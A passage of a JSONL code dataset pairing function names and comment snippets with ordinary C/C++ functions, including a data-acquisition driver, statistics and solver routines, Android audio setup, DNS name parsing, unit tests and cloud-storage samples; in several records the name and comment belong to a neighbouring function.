\u0443\u043a\u0430\u0437\u0430\u0442\u0435\u043b\u044c \u043d\u0430 \u043e\u043f\u0438\u0441\u0430\u0442\u0435\u043b\u044c \u043c\u043e\u0434\u0443\u043b\u044f;\\n     *   frame - \u043f\u0440\u0438\u0437\u043d\u0430\u043a \u043d\u0435\u043e\u0431\u0445\u043e\u0434\u0438\u043c\u043e\u0441\u0442\u0438 \u0437\u0430\u043f\u0443\u0441\u043a\u0430 \u0410\u0426\u041f \u043d\u0430 \u0441\u0431\u043e\u0440 \u043e\u0434\u043d\u043e\u0433\u043e \u043a\u0430\u0434\u0440\u0430.\\n     * \u0412\u041e\u0417\u0412\u0420\u0410\u0429\u0410\u0415\u041c\u041e\u0415 \u0417\u041d\u0410\u0427\u0415\u041d\u0418\u0415\\n     *   \u041a\u043e\u0434 \u043e\u0448\u0438\u0431\u043a\u0438 (\u0441\u043c. \u0437\u0430\u0433\u043e\u043b\u043e\u0432\u043e\u0447\u043d\u044b\u0439 \u0444\u0430\u0439\u043b).\\n     *\/\\n\\n    DWORD ack;\\n    DWORD cmd;\\n\\tINT res;\\n    INT mode = 0;\\n    long n;\\n    INT ret_val = LTR_OK;\\n\\n\\n    if (hnd == NULL)\\n        return LTR114_ERR_INVALID_DESCR;\\n    if (hnd->Active)\\n        return LTR114_ERR_ALREADY_RUN;\\n\\tif (hnd->Reserve == NULL)\\n\\t\\treturn LTR114_ERR_MODULE_CLOSED;\\n\\n\\t\/\/\u0437\u0430\u043f\u0443\u0441\u043a \u043a\u0430\u043b\u0438\u0431\u0440\u043e\u0432\u043a\u0438, \u0435\u0441\u043b\u0438 \u043d\u0435 \u043f\u0440\u043e\u0432\u043e\u0434\u0438\u043b\u0430\u0441\u044c \u0438 \u043d\u0435 \u0431\u044b\u043b\u0430 \u0437\u0430\u043f\u0440\u0435\u0449\u0435\u043d\u0430\\n\\tif (!(((PLTR114_INTERNAL_DATA)hnd->Reserve)->status & LTR114_INTSTATUS_CALIBRATED) && \\n\\t\\t!(hnd->SpecialFeatures & LTR114_FEATURES_CBR_DIS))\\n\\t{\\n\\t\\tres = LTR114_Calibrate(hnd);\\n\\t\\tif (res!=LTR_OK)\\n\\t\\t\\treturn res;\\n\\t}\\n\\n\\n    \/\/filter_data_clear(hnd);\\n    if (frame)\\n        mode |= 0x8000U;\\n    cmd = fill_command(start_cmd, mode);\\n\\n\\n    \/\/\u043f\u043e\u0441\u044b\u043b\u043a\u0430 \u043a\u043e\u043c\u0430\u043d\u0434\u044b RUN\\n    if ((n = LTR_Send(&hnd->Channel, &cmd, 1, send_tm_out)) < 0)\\n        return n;\\n    if (n != 1)\\n        return LTR_ERROR_SEND;\\n    \\n    \/\/\u043f\u0440\u0438\u0435\u043c \u043f\u043e\u0434\u0442\u0432\u0435\u0440\u0436\u0434\u0435\u043d\u0438\u044f\\n    if ((n = LTR_Recv(&hnd->Channel, &ack, NULL, 1, ack_tm_out)) < 0)\\n        return n;\\n    if (n < 1)\\n        return LTR114_ERR_NOACK;\\n    \/\/\u043f\u0440\u043e\u0432\u0435\u0440\u043a\u0430 \u043f\u043e\u0434\u0442\u0432\u0435\u0440\u0436\u0434\u0435\u043d\u0438\u044f\\n    ack &= ack_mask;\\n    if (ack != start_ack)\\n        return LTR114_ERR_INVALIDACK;\\n\\n    hnd->Active = TRUE;\\n\\n    return ret_val;\\n    }'}","id":2867}
{"content":"{'function_name': 'uint_spearman', 'docstring': '\/\/ create workspace', 'code': 'inline double uint_spearman( T const& data1, size_t const stride1,\\n\\t\\t\\t\\t U const& data2, size_t const stride2,\\n\\t\\t\\t\\t double work[] ){\\n      if( 0 != work )\\n\\treturn gsl_stats_uint_spearman( data1, stride1, data2, stride2,\\n\\t\\t\\t\\t\\tdata1.size() \/ stride1, work );\\n      \/\/ create workspace\\n      double* workspace = new double[2 * data1.size() \/ stride1];\\n      double result = gsl_stats_uint_spearman( data1, stride1, data2, stride2,\\n\\t\\t\\t\\t\\t       data1.size() \/ stride1, workspace );\\n      delete[] workspace;\\n      return result;\\n    }'}","id":2876}
{"content":"{'function_name': 'linear_solver_direct_toyexample', 'docstring': '\/\/ cout << \"x = \" << x << endl;', 'code': 'NumericVector linear_solver_toyexample(NumericMatrix mle, NumericVector b)\\n{\\n    int n = b.size();\\n    int nml = mle.nrow();\\n    int k0=0, k1=0, kml=0;\\n    int kiter=0, niter=50000;\\n    double factor=0.0, res=0.0, eps=1.0e-10;\\n    double alpha=0.0, beta=0.0;\\n    NumericVector x(n);\\n    NumericVector y(n);\\n    NumericVector z(n);\\n    NumericVector r(n);\\n    NumericVector d(n);\\n    NumericMatrix lmat(2 * n - 1, 3);\\n    NumericMatrix umat(2 * n - 1, 3);\\n    \/\/ initial guess\\n    for(k0 = 0; k0 < n; k0++)\\n    {\\n        x[k0] = 0.0;\\n    }\\n    for(k0 = 0; k0 < n; k0++)\\n    {\\n        r[k0] = 0.0;\\n        d[k0] = 0.0;\\n    }\\n    umat = sparse_u_factor_toyexample(mle);\\n    lmat = sparse_l_factor_toyexample(mle);\\n    z = inverse_l_vec_toyexample(lmat, b);\\n    for(k0 = 0; k0 < n; k0++)\\n    {\\n        r[k0] = z[k0];\\n        d[k0] = 0.0;\\n    }\\n\\n    \/\/cout << \"z = \" << z << endl;\\n    niter = 5;\\n    for(kiter = 0; kiter < niter; kiter++)\\n    {\\n        y = inverse_u_vec_toyexample(umat, x);\\n        y = sparse_mat_vec_mult_toyexample(mle, y);\\n        y = inverse_l_vec_toyexample(lmat, y);\\n        for(k0 = 0; k0 < n; k0++)\\n        {\\n            r[k0] = z[k0] - y[k0];\\n        }\\n\\n        d = inverse_u_vec_toyexample(umat, r);\\n        d = sparse_mat_vec_mult_toyexample(mle, d);\\n        d = inverse_l_vec_toyexample(lmat, d);\\n\\n        factor = 1.0 * inner_product_toyexample(d, r) \/ (inner_product_toyexample(d, d) + eps);\\n        for(k0 = 0; k0 < n; k0++)\\n        {\\n            x[k0] += factor * r[k0];\\n        }\\n        res = sqrt(inner_product_toyexample(r, r));\\n    }\\n    res = 0.0;\\n    for(k0 = 0; k0 < n; k0++)\\n    {\\n        if(res < abs(r[k0]))\\n        {\\n            res = abs(r[k0]);\\n        }\\n        \/\/ x[k0] += factor * r[k0];\\n    }\\n\\n    \/\/cout << \"residual = \" << res << endl;\\n    return inverse_u_vec_toyexample(umat, x);\\n}'}","id":2878}
{"content":"{'function_name': 'tivi_log_scr', 'docstring': '\/*\\r\\n    \/\/__android_log_print(ANDROID_LOG_DEBUG, \"tivi\",\\r\\n    va_list arglist;\\r\\n    va_start(arglist, format);\\r\\n    __android_log_vprint(ANDROID_LOG_DEBUG, \"tivi\", format, arglist);\\r\\n    va_end(arglist);\\r\\n    *\/', 'code': 'static int t_nativesound_open(JNIEnv *env, int iRate){\\r\\n   \\r\\n   if (!cAudioTrack)\\r\\n   {\\r\\n      \\r\\n      jclass jcls = env->FindClass(\"android\/media\/AudioTrack\");\\r\\n      cAudioTrack = (jclass)env->NewGlobalRef(jcls);\\r\\n      env->DeleteLocalRef(jcls);\\r\\n      \\r\\n      \\r\\n      if (!cAudioTrack) {\\r\\n         iResult=1;\\r\\n         debug_logx(\"cAudioTrack = NULL\");\\r\\n         return 1;\\r\\n      }\\r\\n      \\r\\n      mAudioTrack = env->GetMethodID(cAudioTrack, \"<init>\", \"(IIIIII)V\");\\r\\n      mPlay = env->GetMethodID(cAudioTrack, \"play\", \"()V\");\\r\\n      mWrite = env->GetMethodID(cAudioTrack, \"write\", \"([SII)I\");\\r\\n      mStop = env->GetMethodID(cAudioTrack, \"stop\", \"()V\");\\r\\n      mRelease = env->GetMethodID(cAudioTrack, \"release\", \"()V\");\\r\\n      mGetApos=env->GetMethodID(cAudioTrack, \"getPlaybackHeadPosition\", \"()I\");\/\/\"getPlaybackHeadPosition\",\"()I\");\\r\\n      mGetMinBufferSize = env->GetStaticMethodID(cAudioTrack, \"getMinBufferSize\", \"(III)I\");\\r\\n   }\\r\\n   \/*\\r\\n    public static final int VOICE_CALL\\r\\n    \\r\\n    Since: API Level 4\\r\\n    Voice call uplink + downlink audio source\\r\\n    Constant Value: 4 (0x00000004)\\r\\n    *\/\\r\\n   \/\/#define STREAM_MUSIC 3\\r\\n   \\r\\n   \/\/3\\r\\n#define MODE_STREAM 1\\r\\n   \\r\\n   int sampleRateInHz = iRate;\\r\\n   int channelConfig = CHANNEL_OUT_MONO; \/\/AudioFormat.CHANNEL_OUT_MONO\\r\\n   int audioFormat = ENCODING_PCM_16BIT; \/\/AudioFormat.ENCODING_PCM_16BIT\\r\\n   \\r\\n   iBufferSizeInBytes = env->CallStaticIntMethod(cAudioTrack, mGetMinBufferSize, sampleRateInHz, channelConfig, audioFormat);\\r\\n   iBufferSizeInBytesReal = iBufferSizeInBytes;\\r\\n   \\r\\n   __android_log_print(ANDROID_LOG_DEBUG, \"tivi\",  \"iBufferSizeInBytes=%d\",iBufferSizeInBytes);\\r\\n   \\r\\n   if(iBufferSizeInBytes<SAMPLE_WR*6)iBufferSizeInBytes=SAMPLE_WR*6;\\r\\n   \\r\\n   jobject loc = env->NewObject(cAudioTrack, mAudioTrack,\\r\\n                                STREAM_VOICE_CALL,\/\/STREAM_VOICE_CALL,\\r\\n                                \/\/3,\/\/ STREAM_MUSIC,\\r\\n                                sampleRateInHz, channelConfig, audioFormat, iBufferSizeInBytes, MODE_STREAM); \/\/AudioTrack.MODE_STREAM\\r\\n   \\r\\n   oTrack = env->NewGlobalRef(loc);\\r\\n   env->DeleteLocalRef(loc);\\r\\n   \\r\\n   return 0;\\r\\n}'}","id":2879}
{"content":"{'function_name': 'translateData', 'docstring': '\/* \u904d\u5386data2 *\/', 'code': 'CString getNameInDNS(char *name, const DNS_Header *pDNSHeader)\\n{\\n\\tint pointerPos;\\n\\n\\t\/\/ name\u4e2d\u65e00xC0\u6307\u9488\\n\\tif ((pointerPos = is0xC0PointerInName(name)) == -1)\\n\\t{\\n\\t\\treturn translateNameInDNS(name);\\n\\t}\\n\\telse\\n\\t{\\n\\t\\tint valueOffset = *(name + pointerPos + 1);\\n\\t\\tCString value = get0xC0PointerValue(pDNSHeader, valueOffset);\\n\\n\\t\\tchar *pName = (char*)malloc(pointerPos);\\n\\t\\tmemcpy(pName, name, pointerPos);\\n\\t\\tCString strName(pName);\\n\\t\\tstrName += value;\\n\\n\\t\\tfree(pName);\\n\\t\\treturn strName;\\n\\n\\t}\\n}'}","id":2896}
{"content":"{'function_name': 'find_crossPoint', 'docstring': '\/\/ \u662f\u5426\u8981\u5224\u65ad\u7ebf\u6bb5\u76f8\u4ea4', 'code': 'Point2f get_circle_center1(Point2f A, Point2f B, Point2f C)\\n{\\n    Point2f D,E,center;\\n    float k1,k2;\\n    D.x = (A.x + B.x)\/2.0f;\\n    D.y = (A.y + B.y)\/2.0f;\/\/get the midpoint of line AB\\n    k1 = (A.y - B.y)\/(A.x - B.x);\/\/ get the slope of AB\\n    k2 = -1.0f\/k1;\/\/get the slope of DE,DE is the perpendicular bisector of AB.\\n    E.x = D.x +  50.0f;\/\/E is a point in line DE\\n    E.y = D.y + k2 * 50.0f;\\n    find_crossPoint(A,C,D,E,center);\\n    cout<<\"D.x\"<<D.x<<endl;\\n    cout<<\"D.y\"<<D.y<<endl;\\n    cout<<\"E.x\"<<E.x<<endl;\\n    cout<<\"E.y\"<<E.y<<endl;\\n    cout<<\"K1 \"<<k1<<endl;\\n    cout<<\"k2 \"<<k2<<endl;\\n    return center;\\n}'}","id":2897}
{"content":"{'function_name': 'Array_Sort_TisKeyValuePair_2_t1944347872_TisKeyValuePair_2_t1944347872_m2600216497_gshared', 'docstring': '\/\/ end catch (depth: 1)', 'code': 'void Array_Sort_TisKeyValuePair_2_t1944347872_m533724509_gshared (Il2CppObject * __this \/* static, unused *\/, KeyValuePair_2U5BU5D_t2935491489* ___array, int32_t ___length, Comparison_1_t1780930352 * ___comparison, const MethodInfo* method)\\n{\\n\\tstatic bool s_Il2CppMethodIntialized;\\n\\tif (!s_Il2CppMethodIntialized)\\n\\t{\\n\\t\\til2cpp_codegen_initialize_method (Array_Sort_TisKeyValuePair_2_t1944347872_m533724509_MetadataUsageId);\\n\\t\\ts_Il2CppMethodIntialized = true;\\n\\t}\\n\\tint32_t V_0 = 0;\\n\\tint32_t V_1 = 0;\\n\\tException_t1145979430 * V_2 = NULL;\\n\\tException_t1145979430 * __last_unhandled_exception = 0;\\n\\tNO_UNUSED_WARNING (__last_unhandled_exception);\\n\\tException_t1145979430 * __exception_local = 0;\\n\\tNO_UNUSED_WARNING (__exception_local);\\n\\tint32_t __leave_target = 0;\\n\\tNO_UNUSED_WARNING (__leave_target);\\n\\t{\\n\\t\\tComparison_1_t1780930352 * L_0 = ___comparison;\\n\\t\\tif (L_0)\\n\\t\\t{\\n\\t\\t\\tgoto IL_0011;\\n\\t\\t}\\n\\t}\\n\\t{\\n\\t\\tArgumentNullException_t1144479314 * L_1 = (ArgumentNullException_t1144479314 *)il2cpp_codegen_object_new(ArgumentNullException_t1144479314_il2cpp_TypeInfo_var);\\n\\t\\tArgumentNullException__ctor_m3380712306(L_1, (String_t*)_stringLiteral2610704693, \/*hidden argument*\/NULL);\\n\\t\\tIL2CPP_RAISE_MANAGED_EXCEPTION(L_1);\\n\\t}\\n\\nIL_0011:\\n\\t{\\n\\t\\tint32_t L_2 = ___length;\\n\\t\\tif ((((int32_t)L_2) <= ((int32_t)1)))\\n\\t\\t{\\n\\t\\t\\tgoto IL_0021;\\n\\t\\t}\\n\\t}\\n\\t{\\n\\t\\tKeyValuePair_2U5BU5D_t2935491489* L_3 = ___array;\\n\\t\\tNullCheck(L_3);\\n\\t\\tif ((((int32_t)(((int32_t)((int32_t)(((Il2CppArray *)L_3)->max_length))))) > ((int32_t)1)))\\n\\t\\t{\\n\\t\\t\\tgoto IL_0022;\\n\\t\\t}\\n\\t}\\n\\nIL_0021:\\n\\t{\\n\\t\\treturn;\\n\\t}\\n\\nIL_0022:\\n\\ttry\\n\\t{ \/\/ begin try (depth: 1)\\n\\t\\tV_0 = (int32_t)0;\\n\\t\\tint32_t L_4 = ___length;\\n\\t\\tV_1 = (int32_t)((int32_t)((int32_t)L_4-(int32_t)1));\\n\\t\\tKeyValuePair_2U5BU5D_t2935491489* L_5 = ___array;\\n\\t\\tint32_t L_6 = V_0;\\n\\t\\tint32_t L_7 = V_1;\\n\\t\\tComparison_1_t1780930352 * L_8 = ___comparison;\\n\\t\\t((  void (*) (Il2CppObject * \/* static, unused *\/, KeyValuePair_2U5BU5D_t2935491489*, int32_t, int32_t, Comparison_1_t1780930352 *, const MethodInfo*))IL2CPP_RGCTX_METHOD_INFO(method->rgctx_data, 0)->method)(NULL \/*static, unused*\/, (KeyValuePair_2U5BU5D_t2935491489*)L_5, (int32_t)L_6, (int32_t)L_7, (Comparison_1_t1780930352 *)L_8, \/*hidden argument*\/IL2CPP_RGCTX_METHOD_INFO(method->rgctx_data, 0));\\n\\t\\tgoto IL_004d;\\n\\t} \/\/ end try (depth: 1)\\n\\tcatch(Il2CppExceptionWrapper& e)\\n\\t{\\n\\t\\t__exception_local = (Exception_t1145979430 *)e.ex;\\n\\t\\tif(il2cpp_codegen_class_is_assignable_from (Exception_t1145979430_il2cpp_TypeInfo_var, e.ex->object.klass))\\n\\t\\t\\tgoto CATCH_0036;\\n\\t\\tthrow e;\\n\\t}\\n\\nCATCH_0036:\\n\\t{ \/\/ begin catch(System.Exception)\\n\\t\\t{\\n\\t\\t\\tV_2 = (Exception_t1145979430 *)((Exception_t1145979430 *)__exception_local);\\n\\t\\t\\tString_t* L_9 = Locale_GetText_m1954433032(NULL \/*static, unused*\/, (String_t*)_stringLiteral3192966975, \/*hidden argument*\/NULL);\\n\\t\\t\\tException_t1145979430 * L_10 = V_2;\\n\\t\\t\\tInvalidOperationException_t3683355786 * L_11 = (InvalidOperationException_t3683355786 *)il2cpp_codegen_object_new(InvalidOperationException_t3683355786_il2cpp_TypeInfo_var);\\n\\t\\t\\tInvalidOperationException__ctor_m725121084(L_11, (String_t*)L_9, (Exception_t1145979430 *)L_10, \/*hidden argument*\/NULL);\\n\\t\\t\\tIL2CPP_RAISE_MANAGED_EXCEPTION(L_11);\\n\\t\\t}\\n\\nIL_0048:\\n\\t\\t{\\n\\t\\t\\tgoto IL_004d;\\n\\t\\t}\\n\\t} \/\/ end catch (depth: 1)\\n\\nIL_004d:\\n\\t{\\n\\t\\treturn;\\n\\t}\\n}'}","id":2898}
{"content":"{'function_name': 'CompareBlob', 'docstring': '\/\/ Locals\\r', 'code': 'HRESULT HrCopyBlob(LPCBLOB pIn, LPBLOB pOut)\\r\\n{\\r\\n    \/\/ Locals\\r\\n    HRESULT hr;\\r\\n    ULONG cb = 0;\\r\\n\\r\\n    Assert(pIn && pOut);\\r\\n    if (pIn->cbSize == 0)\\r\\n    {\\r\\n        pOut->cbSize = 0;\\r\\n        pOut->pBlobData = NULL;\\r\\n        return S_OK;\\r\\n    }\\r\\n\\r\\n    \/\/ Dup It...\\r\\n    cb  = pIn->cbSize;\\r\\n#ifdef _WIN64\\r\\n    cb = LcbAlignLcb(cb);\\r\\n#endif \/\/_WIN64\\r\\n\\r\\n    if (SUCCEEDED(hr = HrAlloc((LPVOID *)&pOut->pBlobData, cb)))\\r\\n    {\\r\\n        \/\/ Copy Memory\\r\\n        CopyMemory(pOut->pBlobData, pIn->pBlobData, pIn->cbSize);\\r\\n\\r\\n        \/\/ Set Size\\r\\n        pOut->cbSize = pIn->cbSize;\\r\\n    }\\r\\n    else\\r\\n    {\\r\\n        pOut->cbSize = 0;\\r\\n    }\\r\\n\\r\\n    \/\/ Done\\r\\n    return hr;\\r\\n}'}","id":2908}
{"content":"{'function_name': 'startAlarm', 'docstring': '\/\/ TODO Starting Motor Kills the Arduino', 'code': 'void stopAlarm(bool forceStop = false) {\\n  if ((millis() - startHeld) < 3) return;\\n  Serial.println(\"Alarm turning off!\");\\n\\n  \/\/ disable Alarm\\n  if ((millis() - startHeld) > disableAlarmDelay || forceStop) {\\n    snoozeCount = 0;\\n    snoozeH = -1;\\n    snoozeM = -1;\\n  }\\n  \/\/ Not held long enought, go to snooze\\n  else if (alarmIsOn) {\\n    snoozeCount++;\\n    snoozeM = (alarmM + snoozeTime * snoozeCount) % 60;\\n    snoozeH = (alarmH + (int)((alarmM + snoozeTime * snoozeCount) \/ 60)) % 24;\\n  }\\n\\n  digitalWrite(motorPin, LOW);\\n  alarmIsOn = false;\\n  updateScreen = true;\\n\\n  if (mp3->isRunning())\\n    mp3->stop();\\n}'}","id":2912}
{"content":"{'function_name': 'WinMain', 'docstring': '\/\/ Shutdown Game is in WndProc -- WM_DESTROY', 'code': 'LRESULT CALLBACK ClientWndProc(HWND hWnd, UINT message, WPARAM  wParam, LPARAM lParam)\\n{\\n  switch( message )\\n  {\\n    case WM_PAINT:\\n      SwapBuffers( client->display.getHDC() );\\n      ValidateRect( hWnd, NULL );\\n    \\n      break;\\n\\n    case WM_KEYDOWN:\\n      if ( client != NULL && wParam == VK_TILDE )\\n        if ( console->active() )\\n          console->deactivate();\\n        else\\n          console->activate();\\n\\n      break;\\n\\n    case WM_CHAR:\\n      if ( console->active() )\\n        console->getCommand( wParam, lParam );\\n      \\n      break;\\n    \\n    case WM_KILLFOCUS:\\n      client->display.setFocus( false );\\n      break;\\n\\n    case WM_SETFOCUS:\\n      client->display.setFocus( true );\\n\\n#ifndef _DEBUG \/\/ disable \"always on-top\" so we can see the debugger ;)\\n    case WM_WINDOWPOSCHANGED:\\n    case WM_WINDOWPOSCHANGING:\\n      SetWindowPos( hWnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOSIZE | SWP_NOMOVE ); \/\/ HWND_TOP\\n#endif\\n\\n    break;\\n\\n    case WM_DESTROY:\\n      \/\/client->unload();\\n      \/\/client->shutdown();\\n      PostQuitMessage(0);\\n      break;\\n\\n    default:\\n      return(DefWindowProc(hWnd, message, wParam, lParam));\\n\\n  } \/\/ end switch\\n  \\n  return (0);\\n}'}","id":2913}
{"content":"{'function_name': 'TEST', 'docstring': '\/\/ dequeue', 'code': 'TEST( casual_queue_c_api, enqueue_10__browse_peek__return_false_after_half___expect_half_the_messages)\\n      {\\n         common::unittest::Trace trace;\\n\\n         static constexpr auto number_of_messages = 10;\\n         static constexpr auto half_number_of_messages = number_of_messages \/ 2;\\n\\n         static constexpr auto calculate_size = []( auto value) { return ( value * 10) + 10;};\\n\\n         auto domain = local::domain();\\n\\n         \/\/ use the \"real\" api to enqueue\\n         common::algorithm::for_n< number_of_messages>( []( auto index)\\n         {\\n            queue::Message message;\\n            message.payload.type = common::buffer::type::binary;\\n            message.payload.data = common::unittest::random::binary( calculate_size( index));\\n            \\n            ASSERT_TRUE( queue::enqueue( \"B1\", message));\\n         });\\n\\n         auto handle_message = []( auto id, void* state)\\n         {\\n            auto& count = *static_cast< platform::size::type*>( state);\\n            \\n            casual_buffer_t buffer{};\\n            EXPECT_TRUE( casual_queue_message_get_buffer( id, &buffer) == 0);\\n            EXPECT_TRUE( buffer.size == calculate_size( count));\\n\\n            ++count;\\n\\n            if( count == half_number_of_messages)\\n               return 0;\\n\\n            return 1;\\n         };\\n\\n         platform::size::type count = 0;\\n\\n         EXPECT_TRUE( casual_queue_browse_peek( \"B1\", handle_message, &count) == 0) << \"error: \" << casual_queue_error_string( casual_qerrno);\\n\\n         EXPECT_TRUE( count == half_number_of_messages) << CASUAL_NAMED_VALUE( count);\\n\\n      }'}","id":2925}
{"content":"{'function_name': 'MimeOleCreateVirtualStream', 'docstring': '\/\/ Allocate Virtual Stream\\r', 'code': 'MIMEOLEAPI MimeOleOpenFileStream(LPCSTR pszFilePath, DWORD dwCreationDistribution, DWORD dwAccess, IStream **ppstmFile)\\r\\n{\\r\\n    \/\/ Invalid Arg\\r\\n    if (NULL == pszFilePath || NULL == ppstmFile)\\r\\n        return TrapError(E_INVALIDARG);\\r\\n\\r\\n    \/\/ Call Internal Tool\\r\\n    return OpenFileStream((LPSTR)pszFilePath, dwCreationDistribution, dwAccess, ppstmFile);\\r\\n}'}","id":2929}
{"content":"{'function_name': 'AddBucketLabel', 'docstring': '\/\/! [add bucket label] [START storage_add_bucket_label]', 'code': 'void GetBucketLabels(google::cloud::storage::Client client,\\n                     std::vector<std::string> const& argv) {\\n  \/\/! [get bucket labels] [START storage_get_bucket_labels]\\n  namespace gcs = ::google::cloud::storage;\\n  using ::google::cloud::StatusOr;\\n  [](gcs::Client client, std::string const& bucket_name) {\\n    StatusOr<gcs::BucketMetadata> bucket_metadata =\\n        client.GetBucketMetadata(bucket_name, gcs::Fields(\"labels\"));\\n    if (!bucket_metadata) throw std::move(bucket_metadata).status();\\n\\n    if (bucket_metadata->labels().empty()) {\\n      std::cout << \"The bucket \" << bucket_name << \" has no labels set.\\\\n\";\\n      return;\\n    }\\n\\n    std::cout << \"The labels for bucket \" << bucket_name << \" are:\";\\n    for (auto const& kv : bucket_metadata->labels()) {\\n      std::cout << \"\\\\n  \" << kv.first << \": \" << kv.second;\\n    }\\n    std::cout << \"\\\\n\";\\n  }\\n  \/\/! [get bucket label] [END storage_get_bucket_labels]\\n  (std::move(client), argv.at(0));\\n}'}","id":2931}
{"content":"{'function_name': 'sunday', 'docstring': '\/\/  [PS] i + n <= m\uff1a\u5269\u4f59\u8db3\u591f\u5339\u914d', 'code': 'int shift_and(const char *s, const char *t) {\\n    int d[256] = {0}, n = 0;                              \/\/ d\uff1a\u7f16\u7801\u6570\u7ec4\uff0cn\uff1a\u8bb0\u5f55\u6a21\u5f0f\u4e32\u957f\u5ea6\\n    for (int i = 0; t[i]; n++, i++) d[t[i]] |= (1 << i);  \/\/ \u5efa\u7acbd\\n    int p = 0;                                            \/\/ \u521d\u59cb\u5316\u72b6\u6001p\\n    for (int i = 0; s[i]; i++) {\\n        p = (p << 1 | 1) & d[s[i]];                       \/\/ \u8f6c\u79fb\u8fc7\u7a0b\\n        \/\/ p\u7684\u7b2cn\u4f4d\u4e3a1\uff0c\u5339\u914d\u6210\u529f\\n        if (p & (1 << (n - 1))) return i - n + 1;         \/\/ \u5339\u914d\u5b8c\u6210\\n    }\\n    return -1;\\n}'}","id":2933}
{"content":"{'function_name': 'p_GeoDaWeight__GetNeighborSize', 'docstring': '\/\/ invoke the function', 'code': 'bool p_GeoDaWeight__SaveToFile(SEXP xp, std::string out_path, std::string layer_name, std::string id_name, SEXP id_vec)\\n{\\n  \/\/ grab the object as a XPtr (smart pointer) to GeoDaWeight\\n  Rcpp::XPtr<GeoDaWeight> ptr(xp);\\n\\n  if (TYPEOF(id_vec) == INTSXP) { \/\/ using integers as id_vec\\n    \/\/ convert\\n    std::vector<int> _id_vec = as<std::vector<int> >(id_vec);\\n\\n    \/\/ invoke the function\\n    return ptr->Save(out_path.c_str(), layer_name.c_str(), id_name.c_str(), _id_vec);\\n  } else {\\n    \/\/ using strings as id_vec\\n    std::vector<std::string> tmp = as<std::vector<std::string> >(id_vec);\\n    std::vector<const char*> _id_vec;\\n    for( int i=0; i < tmp.size(); i++ ){\\n      _id_vec.push_back(tmp[i].c_str());\\n    }\\n\\n    \/\/ invoke the function\\n    return ptr->Save(out_path.c_str(), layer_name.c_str(), id_name.c_str(), _id_vec);\\n  }\\n}'}","id":2935}
{"content":"{'function_name': 'main_create', 'docstring': '\/\/    char extra_config[1024];', 'code': 'int main_config_update(int argc, char **argv)\\n{\\n    const char *filename = NULL;\\n    char *p;\\n    char extra_config[1024];\\n    void *config_data = 0;\\n    int config_len = 0;\\n    libxl_domain_config d_config;\\n    int opt, rc;\\n    int option_index = 0;\\n    int debug = 0;\\n    static struct option long_options[] = {\\n        {\"defconfig\", 1, 0, \\'f\\'},\\n        {0, 0, 0, 0}\\n    };\\n\\n    if (argc < 2) {\\n        fprintf(stderr, \"xl config-update requires a domain argument\\\\n\");\\n        exit(1);\\n    }\\n\\n    find_domain(argv[1]);\\n    argc--; argv++;\\n\\n    if (argv[1] && argv[1][0] != \\'-\\' && !strchr(argv[1], \\'=\\')) {\\n        filename = argv[1];\\n        argc--; argv++;\\n    }\\n\\n    while (1) {\\n        opt = getopt_long(argc, argv, \"dhqf:\", long_options, &option_index);\\n        if (opt == -1)\\n            break;\\n\\n        switch (opt) {\\n        case \\'d\\':\\n            debug = 1;\\n            break;\\n        case \\'f\\':\\n            filename = optarg;\\n            break;\\n        default:\\n            fprintf(stderr, \"option `%c\\' not supported.\\\\n\", optopt);\\n            break;\\n        }\\n    }\\n\\n    extra_config[0] = \\'\\\\0\\';\\n    for (p = extra_config; optind < argc; optind++) {\\n        if (strchr(argv[optind], \\'=\\') != NULL) {\\n            p += snprintf(p, sizeof(extra_config) - (p - extra_config),\\n                \"%s\\\\n\", argv[optind]);\\n        } else if (!filename) {\\n            filename = argv[optind];\\n        } else {\\n            return 2;\\n        }\\n    }\\n    if (filename) {\\n        free(config_data);  config_data = 0;\\n        rc = libxl_read_file_contents(ctx, filename,\\n                                      &config_data, &config_len);\\n        if (rc) { fprintf(stderr, \"Failed to read config file: %s: %s\\\\n\",\\n                           filename, strerror(errno)); return ERROR_FAIL; }\\n        if (strlen(extra_config)) {\\n            if (config_len > INT_MAX - (strlen(extra_config) + 2 + 1)) {\\n                fprintf(stderr, \"Failed to attach extra configration\\\\n\");\\n                exit(1);\\n            }\\n            \/* allocate space for the extra config plus two EOLs plus \\\\0 *\/\\n            config_data = realloc(config_data, config_len\\n                + strlen(extra_config) + 2 + 1);\\n            if (!config_data) {\\n                fprintf(stderr, \"Failed to realloc config_data\\\\n\");\\n                exit(1);\\n            }\\n            config_len += sprintf((char *)config_data + config_len, \"\\\\n%s\\\\n\",\\n                extra_config);\\n        }\\n    } else {\\n        fprintf(stderr, \"Config file not specified\\\\n\");\\n        exit(1);\\n    }\\n\\n    libxl_domain_config_init(&d_config);\\n\\n    parse_config_data(filename, (char *)config_data, config_len, &d_config, NULL);\\n\\n    \/\/if (debug || dryrun_only)\\n        \/\/printf_info(default_output_format, -1, &d_config);\\n\\n    if (!dryrun_only) {\\n        fprintf(stderr, \"setting dom%d configuration\\\\n\", domid);\\n        rc = libxl_userdata_store(ctx, domid, \"xl\",\\n                                   (uint8_t *)config_data, config_len);\\n        if (rc) {\\n            fprintf(stderr, \"failed to update configuration\\\\n\");\\n            exit(1);\\n        }\\n    }\\n\\n    libxl_domain_config_dispose(&d_config);\\n\\n    free(config_data);\\n\\n    return 0;\\n}'}","id":2946}
{"content":"{'function_name': 'p_GeoDaWeight__GetMaxNeighbors', 'docstring': '\/\/ invoke the function', 'code': 'double p_GeoDaWeight__GetMeanNeighbors(SEXP xp)\\n{\\n  \/\/ grab the object as a XPtr (smart pointer) to GeoDaWeight\\n  Rcpp::XPtr<GeoDaWeight> ptr(xp);\\n\\n  \/\/ invoke the function\\n  return ptr->GetMeanNbrs();\\n}'}","id":2947}
{"content":"{'function_name': 'async', 'docstring': '\/\/ Use the same async_dispatch than the normal async otherwise', 'code': 'HPX_FORCEINLINE bool apply(Executor&& exec,\\n        hpx::sycl::experimental::sycl_executor::queue_function_code_loc_ptr_t<\\n            Ts>&& f,\\n        Ts&& ts)\\n    {\\n        \/\/ Make sure we only use this for sycl executors\\n        static_assert(std::is_same_v<std::decay_t<Executor>,\\n            hpx::sycl::experimental::sycl_executor>);\\n        \/\/ Use the same apply_dispatch than the normal apply otherwise\\n        return detail::post_dispatch<typename std::decay<Executor>::type>::call(\\n            HPX_FORWARD(Executor, exec),\\n            HPX_FORWARD(hpx::sycl::experimental::sycl_executor::\\n                            queue_function_code_loc_ptr_t<Ts>,\\n                f),\\n            HPX_FORWARD(Ts, ts));\\n    }'}","id":2948}
